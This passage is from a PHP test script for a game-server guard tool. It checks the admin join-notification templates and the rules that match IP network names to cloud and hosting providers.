    $actionRegistry = new ActionRegistry(function (string $command) use (&$emittedCommands): void {
        $emittedCommands[] = $command;
    });

    $metrics = new Metrics();

    return new Guard(
        new IpInfoClient('https://ipinfo.io', null, 2, 0, $metrics),
        new Matcher([]),
        $actionRegistry,
        new Logger(),
        new GuardConfig(
            adminRecipients:     ['admin_1', 'admin_2'],
            onConnectMessageTemplate: '{{player_id}} joined from {{country_name}}',
            onConnectActions:    $onConnectActions,
            onMatchActions:      [],
            retryDelaysMs:       [100],
            maxAttempts:         1,
            cacheTtlSeconds:     60,
            dedupeWindowSeconds: 15,
        ),
        $metrics
    );
};

// Before fix this case emitted 0 admin messages. Now it must emit one per admin.
$commandsMissingAdminTemplate = [];
$guardMissingAdminTemplate = $buildGuardForJoinTest(['CONSOLE_MESSAGE {{msg}}'], $commandsMissingAdminTemplate);
$guardMissingAdminTemplate->handleLogLine('PLAYER_ENTERED_GRID p1 8.8.8.8 Player One');

$adminMessages = array_values(array_filter(
    $commandsMissingAdminTemplate,
    static fn (string $command): bool => str_starts_with($command, 'PLAYER_MESSAGE admin_')
));
$test->assertEquals(2, count($adminMessages), 'Emits fallback admin join message for each admin when onConnect has no {{admin}} template');

// If config already has an admin-targeted template, fallback must not duplicate it.
$commandsWithAdminTemplate = [];
$guardWithAdminTemplate = $buildGuardForJoinTest(['PLAYER_MESSAGE {{admin}} "{{msg}}"'], $commandsWithAdminTemplate);
$guardWithAdminTemplate->handleLogLine('PLAYER_ENTERED_GRID p2 1.1.1.1 Player Two');

$adminMessagesWithTemplate = array_values(array_filter(
    $commandsWithAdminTemplate,
    static fn (string $command): bool => str_starts_with($command, 'PLAYER_MESSAGE admin_')
));
$test->assertEquals(2, count($adminMessagesWithTemplate), 'Does not duplicate admin join message when {{admin}} template already exists');

echo "\n";

// ===================================================================
// Test 10: Provider-specific WHOIS rules (legacy rules preserved)
// ===================================================================
echo "Test 10: Provider-specific WHOIS rules\n";
echo str_repeat("-", 60) . "\n";

$rulesFromConfig = json_decode((string) file_get_contents(__DIR__ . '/config/rules.json'), true);
$test->assertEquals(true, is_array($rulesFromConfig), 'rules.json decodes to array');

$providerMatcher = new Matcher($rulesFromConfig);

$expectedProviderMatches = [
    'AMAZON-02' => 'AWS',
    'Google Cloud Platform' => 'Google Cloud',
    'Microsoft Corporation' => 'Microsoft Azure',
    'Oracle Cloud Infrastructure' => 'Oracle Cloud',
    'Vultr Holdings, LLC' => 'Vultr/Choopa',
    'Akamai Connected Cloud / Linode LLC' => 'Linode/Akamai',
    'DigitalOcean, LLC' => 'DigitalOcean',
    'Hetzner Online GmbH' => 'Hetzner',
    'OVH SAS' => 'OVH',
    'Contabo GmbH' => 'Contabo',
    'ONLINE S.A.S. (Scaleway)' => 'Scaleway',
];

foreach ($expectedProviderMatches as $networkName => $expectedRuleName) {
    $result = $providerMatcher->match($networkName);
    $test->assertEquals(true, $result['matched'], "Matches provider network: {$networkName}");
    $test->assertEquals($expectedRuleName, $result['ruleName'], "Uses expected rule for provider: {$networkName}");
}

$expectedNonMatches = [
    'Orange Polska S.A.',
    'T-Mobile Polska S.A.',
    'Enreach Communications',
    'PLDT Inc.',
];

foreach ($expectedNonMatches as $networkName) {
    $result = $providerMatcher->match($networkName);
    $test->assertEquals(false, $result['matched'], "No broad false-positive match: {$networkName}");
}

echo "\n";

// ===================================================================
// Final Report
// ===================================================================
exit($test->report());
